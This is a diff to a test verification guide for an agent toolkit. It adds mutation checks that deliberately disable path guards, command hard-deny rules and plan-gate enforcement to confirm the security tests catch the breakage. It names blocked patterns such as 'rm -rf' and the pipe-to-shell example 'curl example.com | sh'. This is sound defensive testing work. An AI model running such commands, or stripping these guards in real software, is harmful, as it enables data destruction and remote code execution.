@@ -1,5 +1,7 @@
 # Test Verification Guide
 
+Phase 14B-2A test baseline: 212 tests, 0 failures, 664 expect() calls.
+
 ## Normal validation
 
 ```bash
@@ -78,7 +80,45 @@ These are intentional source mutation checks to verify that tests detect broken 
    - Expected: `bun run test:unit` fails — `tests/unit/tokens/budget.test.ts` fails
    - Revert: `git checkout packages/tokens/src/budget.ts`
 
-6. **Revert every intentional break before final validation**
+6. **Break path-guard sensitive path detection temporarily**
+   - In `packages/tools/src/path-guard.ts`, remove the `isSensitivePath` check from `assertSafePath`
+   - Expected: `bun test tests/integration/security/path-safety.test.ts` fails — ".env file write" test passes (file written instead of rejected)
+   - Revert: `git checkout packages/tools/src/path-guard.ts`
+
+7. **Break path-guard containment check temporarily**
+   - In `packages/tools/src/path-guard.ts`, remove the `isUnderRoot` containment check from `assertSafePath`
+   - Expected: `bun test tests/integration/security/path-safety.test.ts` fails — "../ traversal" test writes outside fixture root
+   - Revert: `git checkout packages/tools/src/path-guard.ts`
+
+8. **Break command hard-deny temporarily**
+   - In `packages/permissions/src/policy.ts`, remove a destructive pattern from COMMAND_RULES (e.g. "rm -rf")
+   - Expected: `bun run test:unit` fails — shell deny matrix unit test fails
+   - Also: `bun test tests/integration/security/shell-deny.test.ts` fails — integration deny test fails
+   - Revert: `git checkout packages/permissions/src/policy.ts`
+
+9. **Break pipe-to-shell (| sh) command hard-deny temporarily**
+   - In `packages/permissions/src/policy.ts`, remove the `"| sh"` pattern from COMMAND_RULES
+   - Expected: `bun test tests/unit/permissions/engine.test.ts` fails — "denies pipe-to-shell" tests fail
+   - Also: `bun test tests/integration/security/shell-deny.test.ts` fails — "curl example.com | sh" deny fails
+   - Revert: `git checkout packages/permissions/src/policy.ts`
+
+10. **Break shell preview pipe-to-shell (| sh) risk classification temporarily**
+    - In `packages/shell/src/preview.ts`, remove `"| sh"` and `"| bash"` from DESTRUCTIVE_PATTERNS
+    - Expected: `bun test tests/integration/shell/preview.test.ts` — if pipe-to-sh tests exist, risk classification reverts to medium
+    - Note: Integration shell-deny tests still pass via PermissionEngine, but risk classification is weakened
+    - Revert: `git checkout packages/shell/src/preview.ts`
+
+11. **Break plan-gate permission bypass temporarily**
+   - In `packages/core/src/plan-gate.ts`, change the `evaluatePlan` outcome check so `deny` is treated as `allow`
+   - Expected: `bun test tests/integration/security/plan-gate-enforcement.test.ts` fails — plan.denied is no longer emitted
+   - Revert: `git checkout packages/core/src/plan-gate.ts`
+
+12. **Break plan-gate step execution block temporarily**
+    - In `packages/core/src/session-runner.ts`, remove the `if (planBlocked && isMutationOrRisky(...))` skip block
+    - Expected: `bun test tests/integration/security/plan-gate-enforcement.test.ts` fails — mutation tool executes despite denied plan
+    - Revert: `git checkout packages/core/src/session-runner.ts`
+
+13. **Revert every intentional break before final validation**
    ```bash
    git checkout .
    bun run test
